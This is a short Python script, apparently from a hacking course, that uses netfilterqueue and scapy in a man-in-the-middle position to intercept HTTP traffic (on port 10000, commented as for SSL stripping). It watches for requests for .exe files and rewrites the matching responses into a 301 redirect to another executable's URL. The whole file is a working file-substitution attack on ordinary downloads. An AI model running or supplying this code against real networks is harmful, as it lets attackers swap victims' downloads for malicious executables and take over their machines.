#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:#change in port number for ssl strip
            #print("[+]HTTP Request")
            if "exe" in scapy_packet[scapy.Raw].load and "10.0.2.15" not in scapy_packet[scapy.Raw].load:
                print("[+]exe request!!")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 10000:#change in port number for ssl strip
            #print("[+]HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+]Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar590.exe" )
                packet.set_payload(str(modified_packet))
    packet.accept()


# basically creating instance of nf queue to interact  with the queue created using iptables
queue = netfilterqueue.NetfilterQueue()
# now we are binding our instance with the actual queue using the queue number and also specifying a call back fun
queue.bind(0, process_packet)
# now  to run the queue
queue.run()



